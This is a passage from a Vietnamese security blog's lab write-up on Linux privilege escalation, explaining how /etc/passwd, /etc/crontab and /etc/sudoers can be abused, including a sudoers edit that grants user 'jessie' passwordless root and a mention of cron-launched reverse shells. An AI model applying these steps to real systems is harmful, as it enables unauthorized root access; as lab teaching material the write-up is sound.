</code></pre></div> </details> <h3 id=etcpasswd><strong>/etc/passwd</strong><a class=headerlink href=#etcpasswd title="Permanent link">&para;</a></h3> <p><code>/etc/passwd</code> là một tệp văn bản trong hệ thống Unix và các hệ thống dựa trên Unix (như Linux) được sử dụng để lưu trữ thông tin tài khoản người dùng:</p> <ul> <li><strong>Trong quá khứ</strong>, nó thường chứa thông tin cơ bản về các tài khoản người dùng trên hệ thống.</li> <li><strong>Hiện nay</strong> nó thường chỉ chứa một loạt các mục thể hiện thông tin người dùng.</li> </ul> <p>Cấu trúc của mỗi dòng trong tệp <code>/etc/passwd</code> bao gồm các trường cách nhau bằng dấu hai chấm (":"):</p> <p>Tên người dùng (Username): Đây là tên đăng nhập duy nhất cho tài khoản người dùng.</p> <ol> <li> <p>Mật khẩu (Password): </p> <ul> <li><strong>Trong quá khứ</strong>, mật khẩu thường được lưu trữ ở đây dưới dạng băm (hash). </li> <li>Hiện nay, hầu hết các hệ thống sử dụng các cơ chế bảo mật khác để lưu trữ mật khẩu, và trường này thường chỉ chứa một dấu "x" hoặc một ký tự ngẫu nhiên. Điều quan trọng hơn hết là password hiện nay sẽ lưu tại /etc/shadow.</li> </ul> </li> <li> <p>User ID (UID): Đây là một số duy nhất được gán cho mỗi người dùng trên hệ thống.</p> </li> <li> <p>Group ID (GID): Đây là số nhóm chứa người dùng, thường là một nhóm mặc định.</p> </li> <li> <p>Thông tin về người dùng (User Info): Mô tả thêm về người dùng hoặc tài khoản.</p> </li> <li> <p>Thư mục nhà (Home Directory): Đây là thư mục mà người dùng sẽ <strong>truy cập</strong> khi đăng nhập.</p> </li> <li> <p>Shell: Đây là chương trình dòng lệnh mà người dùng sử dụng khi đăng nhập.</p> </li> </ol> <p>Tuy nhiên, điều quan trọng cần lưu ý là với các phiên bản hệ điều hành hiện đại, thông tin tài khoản người dùng thường không được lưu trữ trực tiếp trong tệp /etc/passwd nữa vì lý do bảo mật. Thay vào đó, thông tin tài khoản thường được quản lý bởi các cơ chế quản lý tài khoản và bảo mật hệ thống khác (/etc/shadow).</p> <p>Chính vì những lý giải trên, về mặt bản chất file /etc/passwd vẫn có thể lưu password tài khoản được (thay thế vị trí "x" trong file). Nên ta có thể ghi trực tiếp password vào file này.</p> <blockquote> <p>"/etc/shadow làm được thì /etc/passwd làm được"</p> </blockquote> <p> <figure><img src=image-8.png><figcaption>passwd</figcaption> </figure> </p> <h3 id=etccrontab><strong>/etc/crontab</strong><a class=headerlink href=#etccrontab title="Permanent link">&para;</a></h3> <p>Tệp <code>/etc/crontab</code> là một tệp văn bản được sử dụng trong hệ thống Unix và các hệ thống dựa trên Unix (như Linux) để định lịch chạy các tác vụ định kỳ tự động (cron jobs). Cron jobs là các tác vụ được lên lịch để thực hiện một cách tự động vào các thời điểm cụ thể, ví dụ như hàng ngày, hàng tuần, hoặc mỗi giờ.</p> <p>Cấu trúc của mỗi dòng trong tệp /etc/crontab thường bao gồm các trường cách nhau bằng dấu cách:</p> <ul> <li>Phút (Minute): Phút cụ thể trong mỗi giờ mà tác vụ sẽ được thực hiện (giá trị từ 0 đến 59).</li> <li>Giờ (Hour): Giờ cụ thể trong ngày mà tác vụ sẽ được thực hiện (giá trị từ 0 đến 23).</li> <li>Ngày trong tháng (Day of Month): Ngày trong tháng mà tác vụ sẽ được thực hiện (giá trị từ 1 đến 31).</li> <li>Tháng (Month): Tháng mà tác vụ sẽ được thực hiện (giá trị từ 1 đến 12 hoặc có thể sử dụng tên tháng).</li> <li>Ngày trong tuần (Day of Week): Ngày trong tuần mà tác vụ sẽ được thực hiện (giá trị từ 0 đến 6, với 0 là Chủ Nhật).</li> <li>Người dùng (User): Tên người dùng mà tác vụ sẽ được thực hiện dưới quyền của. Đây là tùy chọn, nếu không có, tác vụ sẽ được thực hiện dưới quyền người dùng root.</li> <li>Lệnh (Command): Lệnh cụ thể mà bạn muốn thực hiện trong tác vụ cron.</li> </ul> <p>Tệp <code>/etc/crontab</code> thường chỉ được sửa đổi bởi người dùng có quyền quản trị (root) và chứa các tác vụ được xác định bởi hệ thống hoặc quản trị viên hệ thống để tự động thực hiện các tác vụ như sao lưu dữ liệu, cập nhật hệ thống, hoặc thực hiện các tác vụ định kỳ khác.</p> <p> <figure><img src=image-11.png><figcaption>/etc/crontab</figcaption> </figure> </p> <p>Về phần crontab ta có thể schedule bất kì điều gì. Ví dụ như là mở revershell để chiếm quyền admin,...</p> <blockquote> <p>Dùng lệnh <code>systemctl status cron</code> để xem status cron</p> </blockquote> <p>Ý tưởng tôi muốn thực hiện cronjob ở đây là ghi vào file sudoers, thì ý tưởng này tôi đã triển khai ở dưới phần <strong>/etc/sudoers</strong></p> <p>Bạn có thể xem thêm <a href="https://materials.rangeforce.com/tutorial/2020/04/17/Cron-Privilege-Escalation/#:~:text=Since%20Cron%20runs%20as%20root%20when%20executing%20%2Fetc%2Fcrontab%2C,to%20be%20executed%20by%20Cron%20under%20root%20privileges%21">tại đây</a></p> <h3 id=etcsudoers><strong>/etc/sudoers</strong><a class=headerlink href=#etcsudoers title="Permanent link">&para;</a></h3> <p>Tệp <code>/etc/sudoers</code> là một tệp cấu hình quan trọng trong hệ thống Unix và các hệ thống dựa trên Unix (như Linux), được sử dụng để quản lý quyền truy cập đặc biệt của các người dùng. Nó quản lý quyền truy cập để thực hiện các lệnh với quyền hạn đặc biệt (như quyền root) thông qua lệnh sudo.</p> <p>Tệp /etc/sudoers chứa danh sách các quyền truy cập đặc biệt cho các người dùng hoặc nhóm người dùng cụ thể, cho phép họ thực hiện các lệnh với quyền hạn cao hơn mà họ thường không có. Cấu trúc của tệp này có thể khá phức tạp và đòi hỏi quyền truy cập quản trị (root) để chỉnh sửa.</p> <p>Mỗi dòng trong tệp /etc/sudoers chứa một quyền truy cập được định nghĩa theo cú pháp:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a>nguoidung   ALL=(quyen) lenh
</code></pre></div> <p>Trong đó:</p> <ul> <li><code>nguoidung</code> là tên người dùng hoặc nhóm người dùng được cấp quyền truy cập.</li> <li><code>ALL</code> cho phép người dùng sử dụng sudo từ bất kỳ máy tính nào.</li> <li><code>(quyen)</code> là quyền truy cập cụ thể mà người dùng được phép thực hiện. Ví dụ: ALL, NOPASSWD, ALL=(ALL:ALL), v.v.</li> <li><code>lenh</code> là lệnh cụ thể mà người dùng có thể thực hiện với quyền đặc biệt.</li> </ul> <p>Ví dụ cụ thể về nội dung trong tệp /etc/sudoers:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a><span class=c># Cho phép người dùng alice thực hiện bất kỳ lệnh nào với quyền root mà không cần mật khẩu</span>
<a id=__codelineno-9-2 name=__codelineno-9-2 href=#__codelineno-9-2></a><span class=n>alice</span>   <span class=n>ALL</span><span class=p>=(</span><span class=n>ALL</span><span class=p>:</span><span class=n>ALL</span><span class=p>)</span> <span class=n>NOPASSWD</span><span class=p>:</span> <span class=n>ALL</span>
<a id=__codelineno-9-3 name=__codelineno-9-3 href=#__codelineno-9-3></a>
<a id=__codelineno-9-4 name=__codelineno-9-4 href=#__codelineno-9-4></a><span class=c># Cho phép người dùng bob thực hiện lệnh reboot mà không cần mật khẩu</span>
<a id=__codelineno-9-5 name=__codelineno-9-5 href=#__codelineno-9-5></a><span class=n>bob</span>     <span class=n>ALL</span><span class=p>=(</span><span class=n>ALL</span><span class=p>)</span> <span class=n>NOPASSWD</span><span class=p>:</span> <span class=p>/</span><span class=n>sbin</span><span class=p>/</span><span class=n>reboot</span>
</code></pre></div> <p>File sudoers trong CorpOne sẽ như thế này đây</p> <p> <figure><img src=image-12.png><figcaption>/etc/sudoers</figcaption> </figure> </p> <p>Ta chỉnh cần chỉnh dòng <code>jessie ALL=(root) NOPASSWD: /usr/bin/wget</code> thành <code>jessie ALL=(root) NOPASSWD: ALL</code> để user jessie leo quyền thành công.</p> <p> <figure><img src=image-13.png><figcaption>root</figcaption> </figure> </p> <h2 id=what-we-learned><strong>What we learned</strong><a class=headerlink href=#what-we-learned title="Permanent link">&para;</a></h2> <ol> <li>Privilege Escalation with wget </li> </ol> <hr> <div class=md-source-file> <small> Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">August 30, 2023</span> <br> Created: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">August 30, 2023</span> </small> </div> <h2 id=__comments><strong>Comments</strong></h2> <script src=https://giscus.app/client.js data-repo=hieuhdh/hieuhdh.github.io data-repo-id=R_kgDOHowGCg data-category=General data-category-id=DIC_kwDOHowGCs4CQLlU data-mapping=pathname data-reactions-enabled=1 data-emit-metadata=1 data-theme=preferred_color_scheme data-lang=en crossorigin=anonymous async></script> <script>
  var theme, giscus = document.querySelector("script[src*=giscus]"),
    palette = __md_get("__palette");
  palette && "object" == typeof palette.color && (theme = "slate" === palette.color.scheme ? "dark" : "light", giscus
    .setAttribute("data-theme", theme)), document.addEventListener("DOMContentLoaded", function () {
    document.querySelector("[data-md-component=palette]").addEventListener("change", function () {
      var e = __md_get("__palette");
      e && "object" == typeof e.color && (e = "slate" === e.color.scheme ? "dark" : "light", document
        .querySelector(".giscus-frame").contentWindow.postMessage({
          giscus: {
            setConfig: {
              theme: e
            }
          }
        }, "https://giscus.app"))
    })
  })

</script> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> Back to top </a> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2023 0x5h1n0k0 </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../..", "features": ["content.code.annotate", "content.tooltips", "navigation.sections", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src=../../../assets/javascripts/bundle.6c7ad80a.min.js></script> <script src=../../../assets/javascripts/cursor-effects.js></script> <!-- get ip
        <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
        <script>
            function taskService() {
                this.postListApi = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskService();

            TaskList.postListApi()
                .then(function (result) {

                    function taskService02() {
                        this.getListApiii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                },
                            });
                        };
                    }
                    var TaskListList = new taskService02();

                    TaskListList.getListApiii()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-user").innerHTML = result.data.sl + " times"
                            } else {
                                document.getElementById("view-user").innerHTML = result.data.sl + " time"
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                        
                    function taskService01() {
                        this.getListApii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views_total/",
                                method: "GET",
                            });
                        };
                    }
                    var TaskListt = new taskService01();

                    TaskListt.getListApii()
                        .then(function (result) {
                            document.getElementById("view-all").innerHTML = result.data
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script>

        <script>
            function taskServicePost() {
                this.postListApiTotal = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskServicePost();
            var arr = window.location.pathname.split('/');


            TaskList.postListApiTotal()
                .then(function (result) {

                    function taskServicePost02() {
                        this.getListApiUser = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListUser = new taskServicePost02();

                    TaskListUser.getListApiUser()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " times";
                            } else {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });

                        function taskServicePost01() {
                        this.getListApiTotal = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views_total/",
                                method: "POST",
                                data: {
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListTotal = new taskServicePost01();

                    TaskListTotal.getListApiTotal()
                        .then(function (result) {
                            if (result.data > 1) {
                                document.getElementById("view-post-all").innerHTML = result.data + " times";
                            } else {
                                document.getElementById("view-post-all").innerHTML = result.data + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script> --> <script src=../../../javascripts/consent.js></script> <script src=../../../javascripts/mathjax.js></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script> <script src=https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js></script> <script src=../../../javascripts/tablesort.js></script> <script src=../../../overrides/assets/javascripts/bundle.ed7d8744.min.js></script> <script src=../../../overrides/assets/javascripts/cursor-effects.js></script> <!-- <script src="../../../assets/javascripts/cursor-effects.js"></script> --> </body> </html>